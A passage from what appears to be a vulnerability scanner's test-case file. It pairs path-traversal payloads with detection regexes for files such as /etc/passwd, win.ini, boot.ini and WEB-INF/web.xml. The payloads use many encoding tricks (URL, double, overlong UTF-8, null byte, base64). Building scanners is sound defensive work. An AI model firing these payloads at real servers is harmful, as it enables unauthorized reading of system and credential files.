        "target": "(\\<%[\\s\\S]*Response\\.Write[\\s\\S]*%\\>)|(^\\<\\?php[\\x20-\\x80\\x0d\\x0a\\x09]+)|(using\\sSystem;\\n[\\s\\S]*?class\\s[\\s\\S]*?\\s?{[\\s\\S]*})|(^#\\!\\/[\\s\\S]*?\\/perl)|(^#\\!\\/usr\\/bin\\/env\\spython)|(^#\\!\\/[\\s\\S]*?\\/python)|(^#\\!\\\\\\/[\\s\\S]*\\\\\\/perl)",
        "input": "file_name.back",
        "encode":  "NO",
    },

    {
        "case_id": 1200220071,
        "target": "(\\<%[\\s\\S]*Response\\.Write[\\s\\S]*%\\>)|(^\\<\\?php[\\x20-\\x80\\x0d\\x0a\\x09]+)|(using\\sSystem;\\n[\\s\\S]*?class\\s[\\s\\S]*?\\s?{[\\s\\S]*})|(^#\\!\\/[\\s\\S]*?\\/perl)|(^#\\!\\/usr\\/bin\\/env\\spython)|(^#\\!\\/[\\s\\S]*?\\/python)|(^#\\!\\\\\\/[\\s\\S]*\\\\\\/perl)",
        "input": "file_name.backup",
        "encode":  "NO",
    },

]

any_file_read_detect_test_cases = [

    {
        "case_id": 1040010097,
        "target": "(<web-app\\s(.|[\\n\\r])+?<\\/web-app>)",
        "input": "//../....//....//WEB-INF/web.xml",
        "encode":  "NO",
    },

    {
        "case_id": 1040010098,
        "target": "(<web-app\\s(.|[\\n\\r])+?<\\/web-app>)",
        "input": "WEB-INF/web.xml",
        "encode":  "NO",
    },

    {
        "case_id": 1040010099,
        "target": "(<web-app\\s(.|[\\n\\r])+?<\\/web-app>)",
        "input": "WEB-INF\\\\web.xml",
        "encode":  "NO",
    },

    {
        "case_id": 1040010100,
        "target": "(<web-app\\s(.|[\\n\\r])+?<\\/web-app>)",
        "input": "\\..\\..\\WEB-INF\\web.xml",
        "encode":  "NO",
    },

    {
        "case_id": 1040010102,
        "target": "(\\[boot loader\\])|(;\\s*for\\s16-bit\\sapp\\ssupport)|(System\\.IO\\.FileNotFoundException: Could not find file\\s'\\w:(boot\\.ini|windows\\\\win.ini))|(System\\.IO\\.DirectoryNotFoundException: Could not find a part of the path\\s'\\w:(boot\\.ini|windows\\\\win.ini))",
        "input": "../../../../../../../../../../boot.ini%00.htm",
        "encode":  "NO",
    },

    {
        "case_id": 1040010103,
        "target": "(\\[boot loader\\])|(;\\s*for\\s16-bit\\sapp\\ssupport)|(System\\.IO\\.FileNotFoundException: Could not find file\\s'\\w:(boot\\.ini|windows\\\\win.ini))|(System\\.IO\\.DirectoryNotFoundException: Could not find a part of the path\\s'\\w:(boot\\.ini|windows\\\\win.ini))",
        "input": "../../../../../../../../../../boot.ini%00.txt",
        "encode":  "NO",
    },

    {
        "case_id": 1040010091,
        "target": "(;\\s*for\\s16-bit\\sapp\\ssupport)|(System\\.IO\\.FileNotFoundException: Could not find file\\s'\\w:(boot\\.ini|windows\\\\win.ini))|(System\\.IO\\.DirectoryNotFoundException: Could not find a part of the path\\s'\\w:(boot\\.ini|windows\\\\win.ini))",
        "input": "/\\\\../\\\\../\\\\../\\\\../\\\\../\\\\../\\\\../\\\\../windows/win.ini",
        "encode":  "NO",
    },

    {
        "case_id": 1040010092,
        "target": "(;\\s*for\\s16-bit\\sapp\\ssupport)|(System\\.IO\\.FileNotFoundException: Could not find file\\s'\\w:(boot\\.ini|windows\\\\win.ini))|(System\\.IO\\.DirectoryNotFoundException: Could not find a part of the path\\s'\\w:(boot\\.ini|windows\\\\win.ini))",
        "input": "/\\\\\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows/win.ini",
        "encode":  "NO",
    },

    {
        "case_id": 1040010093,
        "target": "(<web-app\\s(.|[\\n\\r])+?<\\/web-app>)",
        "input": "../../WEB-INF/web.xml",
        "encode":  "NO",
    },

    {
        "case_id": 1040010094,
        "target": "(<web-app\\s(.|[\\n\\r])+?<\\/web-app>)",
        "input": "..\\..\\WEB-INF\\web.xml",
        "encode":  "NO",
    },

    {
        "case_id": 1040010095,
        "target": "(<web-app\\s(.|[\\n\\r])+?<\\/web-app>)",
        "input": "/../../WEB-INF/web.xml",
        "encode":  "NO",
    },

    {
        "case_id": 1040010101,
        "target": "(\\[boot loader\\])|(;\\s*for\\s16-bit\\sapp\\ssupport)|(System\\.IO\\.FileNotFoundException: Could not find file\\s'\\w:(boot\\.ini|windows\\\\win.ini))|(System\\.IO\\.DirectoryNotFoundException: Could not find a part of the path\\s'\\w:(boot\\.ini|windows\\\\win.ini))",
        "input": "../../../../../../../../../../boot.ini",
        "encode":  "NO",
    },

    {
        "case_id": 1040010090,
        "target": "(;\\s*for\\s16-bit\\sapp\\ssupport)|(System\\.IO\\.FileNotFoundException: Could not find file\\s'\\w:(boot\\.ini|windows\\\\win.ini))|(System\\.IO\\.DirectoryNotFoundException: Could not find a part of the path\\s'\\w:(boot\\.ini|windows\\\\win.ini))",
        "input": "/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../windows/win.ini",
        "encode":  "NO",
    },

    {
        "case_id": 1040010086,
        "target": "(;\\s*for\\s16-bit\\sapp\\ssupport)|(System\\.IO\\.FileNotFoundException: Could not find file\\s'\\w:(boot\\.ini|windows\\\\win.ini))|(System\\.IO\\.DirectoryNotFoundException: Could not find a part of the path\\s'\\w:(boot\\.ini|windows\\\\win.ini))",
        "input": "/.\\\\/\\\\.\\\\.\\\\/\\\\.\\\\.\\\\/\\\\.\\\\.\\\\/\\\\.\\\\.\\\\/\\\\.\\\\.\\\\/\\\\.\\\\.\\\\/\\\\.\\\\.\\\\/\\\\.\\\\windows/win.ini",
        "encode":  "NO",
    },

    {
        "case_id": 1040010087,
        "target": "(;\\s*for\\s16-bit\\sapp\\ssupport)|(System\\.IO\\.FileNotFoundException: Could not find file\\s'\\w:(boot\\.ini|windows\\\\win.ini))|(System\\.IO\\.DirectoryNotFoundException: Could not find a part of the path\\s'\\w:(boot\\.ini|windows\\\\win.ini))",
        "input": "/.\\\\\\\\..\\\\\\\\.\\\\\\\\..\\\\\\\\.\\\\\\\\..\\\\\\\\.\\\\\\\\..\\\\\\\\.\\\\\\\\..\\\\\\\\.\\\\\\\\..\\\\\\\\.\\\\\\\\..\\\\\\\\.\\\\\\\\..\\\\\\\\windows/win.ini",
        "encode":  "NO",
    },

    {
        "case_id": 1040010088,
        "target": "(;\\s*for\\s16-bit\\sapp\\ssupport)|(System\\.IO\\.FileNotFoundException: Could not find file\\s'\\w:(boot\\.ini|windows\\\\win.ini))|(System\\.IO\\.DirectoryNotFoundException: Could not find a part of the path\\s'\\w:(boot\\.ini|windows\\\\win.ini))",
        "input": "/.\\\\\\\\./.\\\\\\\\./.\\\\\\\\./.\\\\\\\\./.\\\\\\\\./.\\\\\\\\./windows/win.ini",
        "encode":  "NO",
    },

    {
        "case_id": 1040010096,
        "target": "(<web-app\\s(.|[\\n\\r])+?<\\/web-app>)",
        "input": "/..\\..\\WEB-INF\\web.xml",
        "encode":  "NO",
    },

    {
        "case_id": 1040010089,
        "target": "(;\\s*for\\s16-bit\\sapp\\ssupport)|(System\\.IO\\.FileNotFoundException: Could not find file\\s'\\w:(boot\\.ini|windows\\\\win.ini))|(System\\.IO\\.DirectoryNotFoundException: Could not find a part of the path\\s'\\w:(boot\\.ini|windows\\\\win.ini))",
        "input": "//\\\\../\\\\../\\\\../\\\\../\\\\../\\\\../\\\\../\\\\../windows/win.ini",
        "encode":  "NO",
    },

    {
        "case_id": 1040010085,
        "target": "(;\\s*for\\s16-bit\\sapp\\ssupport)|(System\\.IO\\.FileNotFoundException: Could not find file\\s'\\w:(boot\\.ini|windows\\\\win.ini))|(System\\.IO\\.DirectoryNotFoundException: Could not find a part of the path\\s'\\w:(boot\\.ini|windows\\\\win.ini))",
        "input": "/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../windows/win.ini",
        "encode":  "NO",
    },

    {
        "case_id": 1040010083,
        "target": "(;\\s*for\\s16-bit\\sapp\\ssupport)|(System\\.IO\\.FileNotFoundException: Could not find file\\s'\\w:(boot\\.ini|windows\\\\win.ini))|(System\\.IO\\.DirectoryNotFoundException: Could not find a part of the path\\s'\\w:(boot\\.ini|windows\\\\win.ini))",
        "input": "/..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cwindows/win.ini",
        "encode":  "NO",
    },

    {
        "case_id": 1040010084,
        "target": "(;\\s*for\\s16-bit\\sapp\\ssupport)|(System\\.IO\\.FileNotFoundException: Could not find file\\s'\\w:(boot\\.ini|windows\\\\win.ini))|(System\\.IO\\.DirectoryNotFoundException: Could not find a part of the path\\s'\\w:(boot\\.ini|windows\\\\win.ini))",
        "input": "/..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\windows/win.ini",
        "encode":  "NO",
    },

    {
        "case_id": 1040010082,
        "target": "(;\\s*for\\s16-bit\\sapp\\ssupport)|(System\\.IO\\.FileNotFoundException: Could not find file\\s'\\w:(boot\\.ini|windows\\\\win.ini))|(System\\.IO\\.DirectoryNotFoundException: Could not find a part of the path\\s'\\w:(boot\\.ini|windows\\\\win.ini))",
        "input": "/../../../../../../../../windows/win.ini%00en",
        "encode":  "NO",
    },

    {
        "case_id": 1040010080,
        "target": "(;\\s*for\\s16-bit\\sapp\\ssupport)|(System\\.IO\\.FileNotFoundException: Could not find file\\s'\\w:(boot\\.ini|windows\\\\win.ini))|(System\\.IO\\.DirectoryNotFoundException: Could not find a part of the path\\s'\\w:(boot\\.ini|windows\\\\win.ini))",
        "input": "/..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215windows/win.ini",
        "encode":  "NO",
    },

    {
        "case_id": 1040010079,
        "target": "(;\\s*for\\s16-bit\\sapp\\ssupport)|(System\\.IO\\.FileNotFoundException: Could not find file\\s'\\w:(boot\\.ini|windows\\\\win.ini))|(System\\.IO\\.DirectoryNotFoundException: Could not find a part of the path\\s'\\w:(boot\\.ini|windows\\\\win.ini))",
        "input": "/..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c/windows/win.ini",
        "encode":  "NO",
    },

    {
        "case_id": 1040010077,
        "target": "(;\\s*for\\s16-bit\\sapp\\ssupport)|(System\\.IO\\.FileNotFoundException: Could not find file\\s'\\w:(boot\\.ini|windows\\\\win.ini))|(System\\.IO\\.DirectoryNotFoundException: Could not find a part of the path\\s'\\w:(boot\\.ini|windows\\\\win.ini))",
        "input": "/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini",
        "encode":  "NO",
    },

    {
        "case_id": 1040010078,
        "target": "(;\\s*for\\s16-bit\\sapp\\ssupport)|(System\\.IO\\.FileNotFoundException: Could not find file\\s'\\w:(boot\\.ini|windows\\\\win.ini))|(System\\.IO\\.DirectoryNotFoundException: Could not find a part of the path\\s'\\w:(boot\\.ini|windows\\\\win.ini))",
        "input": "/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows/win.ini",
        "encode":  "NO",
    },

    {
        "case_id": 1040010076,
        "target": "(;\\s*for\\s16-bit\\sapp\\ssupport)|(System\\.IO\\.FileNotFoundException: Could not find file\\s'\\w:(boot\\.ini|windows\\\\win.ini))|(System\\.IO\\.DirectoryNotFoundException: Could not find a part of the path\\s'\\w:(boot\\.ini|windows\\\\win.ini))",
        "input": "/..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c/windows/win.ini",
        "encode":  "NO",
    },

    {
        "case_id": 1040010075,
        "target": "(;\\s*for\\s16-bit\\sapp\\ssupport)|(System\\.IO\\.FileNotFoundException: Could not find file\\s'\\w:(boot\\.ini|windows\\\\win.ini))|(System\\.IO\\.DirectoryNotFoundException: Could not find a part of the path\\s'\\w:(boot\\.ini|windows\\\\win.ini))",
        "input": "/..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af/windows/win.ini",
        "encode":  "NO",
    },

    {
        "case_id": 1040010074,
        "target": "(;\\s*for\\s16-bit\\sapp\\ssupport)|(System\\.IO\\.FileNotFoundException: Could not find file\\s'\\w:(boot\\.ini|windows\\\\win.ini))|(System\\.IO\\.DirectoryNotFoundException: Could not find a part of the path\\s'\\w:(boot\\.ini|windows\\\\win.ini))",
        "input": "/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fwindows/win.ini",
        "encode":  "NO",
    },

    {
        "case_id": 1040010072,
        "target": "(;\\s*for\\s16-bit\\sapp\\ssupport)|(System\\.IO\\.FileNotFoundException: Could not find file\\s'\\w:(boot\\.ini|windows\\\\win.ini))|(System\\.IO\\.DirectoryNotFoundException: Could not find a part of the path\\s'\\w:(boot\\.ini|windows\\\\win.ini))",
        "input": "/%c0%ae%c0%ae\\%c0%ae%c0%ae\\%c0%ae%c0%ae\\%c0%ae%c0%ae\\%c0%ae%c0%ae\\%c0%ae%c0%ae\\%c0%ae%c0%ae\\%c0%ae%c0%ae\\windows/win.ini",
        "encode":  "NO",
    },

    {
        "case_id": 1040010073,
        "target": "(;\\s*for\\s16-bit\\sapp\\ssupport)|(System\\.IO\\.FileNotFoundException: Could not find file\\s'\\w:(boot\\.ini|windows\\\\win.ini))|(System\\.IO\\.DirectoryNotFoundException: Could not find a part of the path\\s'\\w:(boot\\.ini|windows\\\\win.ini))",
        "input": "/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/windows/win.ini",
        "encode":  "NO",
    },

    {
        "case_id": 1040010071,
        "target": "(;\\s*for\\s16-bit\\sapp\\ssupport)|(System\\.IO\\.FileNotFoundException: Could not find file\\s'\\w:(boot\\.ini|windows\\\\win.ini))|(System\\.IO\\.DirectoryNotFoundException: Could not find a part of the path\\s'\\w:(boot\\.ini|windows\\\\win.ini))",
        "input": "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini",
        "encode":  "NO",
    },

    {
        "case_id": 1040010069,
        "target": "(;\\s*for\\s16-bit\\sapp\\ssupport)|(System\\.IO\\.FileNotFoundException: Could not find file\\s'\\w:(boot\\.ini|windows\\\\win.ini))|(System\\.IO\\.DirectoryNotFoundException: Could not find a part of the path\\s'\\w:(boot\\.ini|windows\\\\win.ini))",
        "input": "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini",
        "encode":  "NO",
    },

    {
        "case_id": 1040010070,
        "target": "(;\\s*for\\s16-bit\\sapp\\ssupport)|(System\\.IO\\.FileNotFoundException: Could not find file\\s'\\w:(boot\\.ini|windows\\\\win.ini))|(System\\.IO\\.DirectoryNotFoundException: Could not find a part of the path\\s'\\w:(boot\\.ini|windows\\\\win.ini))",
        "input": "/%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\windows/win.ini",
        "encode":  "NO",
    },

    {
        "case_id": 1040010068,
        "target": "(;\\s*for\\s16-bit\\sapp\\ssupport)|(System\\.IO\\.FileNotFoundException: Could not find file\\s'\\w:(boot\\.ini|windows\\\\win.ini))|(System\\.IO\\.DirectoryNotFoundException: Could not find a part of the path\\s'\\w:(boot\\.ini|windows\\\\win.ini))",
        "input": "/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows/win.ini",
        "encode":  "NO",
    },

    {
        "case_id": 1040010067,
        "target": "(;\\s*for\\s16-bit\\sapp\\ssupport)|(System\\.IO\\.FileNotFoundException: Could not find file\\s'\\w:(boot\\.ini|windows\\\\win.ini))|(System\\.IO\\.DirectoryNotFoundException: Could not find a part of the path\\s'\\w:(boot\\.ini|windows\\\\win.ini))",
        "input": "/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fwindows/win.ini",
        "encode":  "NO",
    },

    {
        "case_id": 1040010066,
        "target": "(;\\s*for\\s16-bit\\sapp\\ssupport)|(System\\.IO\\.FileNotFoundException: Could not find file\\s'\\w:(boot\\.ini|windows\\\\win.ini))|(System\\.IO\\.DirectoryNotFoundException: Could not find a part of the path\\s'\\w:(boot\\.ini|windows\\\\win.ini))",
        "input": "/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%2/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c5c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/windows/win.ini",
        "encode":  "NO",
    },

    {
        "case_id": 1040010065,
        "target": "(;\\s*for\\s16-bit\\sapp\\ssupport)|(System\\.IO\\.FileNotFoundException: Could not find file\\s'\\w:(boot\\.ini|windows\\\\win.ini))|(System\\.IO\\.DirectoryNotFoundException: Could not find a part of the path\\s'\\w:(boot\\.ini|windows\\\\win.ini))",
        "input": "/%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25afwindows/win.ini",
        "encode":  "NO",
    },

    {
        "case_id": 1040010063,
        "target": "(;\\s*for\\s16-bit\\sapp\\ssupport)|(System\\.IO\\.FileNotFoundException: Could not find file\\s'\\w:(boot\\.ini|windows\\\\win.ini))|(System\\.IO\\.DirectoryNotFoundException: Could not find a part of the path\\s'\\w:(boot\\.ini|windows\\\\win.ini))",
        "input": "/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/windows/win.ini",
        "encode":  "NO",
    },

    {
        "case_id": 1040010064,
        "target": "(;\\s*for\\s16-bit\\sapp\\ssupport)|(System\\.IO\\.FileNotFoundException: Could not find file\\s'\\w:(boot\\.ini|windows\\\\win.ini))|(System\\.IO\\.DirectoryNotFoundException: Could not find a part of the path\\s'\\w:(boot\\.ini|windows\\\\win.ini))",
        "input": "/%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\windows/win.ini",
        "encode":  "NO",
    },

    {
        "case_id": 1040010062,
        "target": "(;\\s*for\\s16-bit\\sapp\\ssupport)|(System\\.IO\\.FileNotFoundException: Could not find file\\s'\\w:(boot\\.ini|windows\\\\win.ini))|(System\\.IO\\.DirectoryNotFoundException: Could not find a part of the path\\s'\\w:(boot\\.ini|windows\\\\win.ini))",
        "input": "/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows/win.ini",
        "encode":  "NO",
    },

    {
        "case_id": 1040010061,
        "target": "(;\\s*for\\s16-bit\\sapp\\ssupport)|(System\\.IO\\.FileNotFoundException: Could not find file\\s'\\w:(boot\\.ini|windows\\\\win.ini))|(System\\.IO\\.DirectoryNotFoundException: Could not find a part of the path\\s'\\w:(boot\\.ini|windows\\\\win.ini))",
        "input": "/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwindows/win.ini",
        "encode":  "NO",
    },

    {
        "case_id": 1040010059,
        "target": "(;\\s*for\\s16-bit\\sapp\\ssupport)|(System\\.IO\\.FileNotFoundException: Could not find file\\s'\\w:(boot\\.ini|windows\\\\win.ini))|(System\\.IO\\.DirectoryNotFoundException: Could not find a part of the path\\s'\\w:(boot\\.ini|windows\\\\win.ini))",
        "input": "../..//../..//../..//../..//../..//../..//../..//../..//windows/win.ini",
        "encode":  "NO",
    },

    {
        "case_id": 1040010060,
        "target": "(;\\s*for\\s16-bit\\sapp\\ssupport)|(System\\.IO\\.FileNotFoundException: Could not find file\\s'\\w:(boot\\.ini|windows\\\\win.ini))|(System\\.IO\\.DirectoryNotFoundException: Could not find a part of the path\\s'\\w:(boot\\.ini|windows\\\\win.ini))",
        "input": "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
        "encode":  "NO",
    },

    {
        "case_id": 1040010058,
        "target": "(;\\s*for\\s16-bit\\sapp\\ssupport)|(System\\.IO\\.FileNotFoundException: Could not find file\\s'\\w:(boot\\.ini|windows\\\\win.ini))|(System\\.IO\\.DirectoryNotFoundException: Could not find a part of the path\\s'\\w:(boot\\.ini|windows\\\\win.ini))",
        "input": "../../../../../../../../../../windows/win.ini%00.",
        "encode":  "NO",
    },

    {
        "case_id": 1040010056,
        "target": "(;\\s*for\\s16-bit\\sapp\\ssupport)|(System\\.IO\\.FileNotFoundException: Could not find file\\s'\\w:(boot\\.ini|windows\\\\win.ini))|(System\\.IO\\.DirectoryNotFoundException: Could not find a part of the path\\s'\\w:(boot\\.ini|windows\\\\win.ini))",
        "input": "../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././windows/win.ini",
        "encode":  "NO",
    },

    {
        "case_id": 1040010057,
        "target": "(;\\s*for\\s16-bit\\sapp\\ssupport)|(System\\.IO\\.FileNotFoundException: Could not find file\\s'\\w:(boot\\.ini|windows\\\\win.ini))|(System\\.IO\\.DirectoryNotFoundException: Could not find a part of the path\\s'\\w:(boot\\.ini|windows\\\\win.ini))",
        "input": "../../../../../../../../../../windows/win.ini",
        "encode":  "NO",
    },

    {
        "case_id": 1040010054,
        "target": "(;\\s*for\\s16-bit\\sapp\\ssupport)|(System\\.IO\\.FileNotFoundException: Could not find file\\s'\\w:(boot\\.ini|windows\\\\win.ini))|(System\\.IO\\.DirectoryNotFoundException: Could not find a part of the path\\s'\\w:(boot\\.ini|windows\\\\win.ini))",
        "input": "%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afwindows%c0%afwin.ini",
        "encode":  "NO",
    },

    {
        "case_id": 1040010055,
        "target": "(;\\s*for\\s16-bit\\sapp\\ssupport)|(System\\.IO\\.FileNotFoundException: Could not find file\\s'\\w:(boot\\.ini|windows\\\\win.ini))|(System\\.IO\\.DirectoryNotFoundException: Could not find a part of the path\\s'\\w:(boot\\.ini|windows\\\\win.ini))",
        "input": "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini",
        "encode":  "NO",
    },

    {
        "case_id": 1040010052,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "file:///etc/passwd",
        "encode":  "NO",
    },

    {
        "case_id": 1040010053,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "invalid../../../../../../../../../../etc/passwd/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.",
        "encode":  "NO",
    },

    {
        "case_id": 1040010051,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAucG5n",
        "encode":  "NO",
    },

    {
        "case_id": 1040010047,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "/\\\\../\\\\../\\\\../\\\\../\\\\../\\\\../\\\\../\\\\../etc/passwd",
        "encode":  "NO",
    },

    {
        "case_id": 1040010050,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "/etc/passwd",
        "encode":  "NO",
    },

    {
        "case_id": 1040010049,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "/\\\\\\\\\\\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc/passwd",
        "encode":  "NO",
    },

    {
        "case_id": 1040010048,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "/\\\\../\\\\../\\\\../\\\\../\\\\../\\\\../\\\\../etc/passwd",
        "encode":  "NO",
    },

    {
        "case_id": 1040010044,
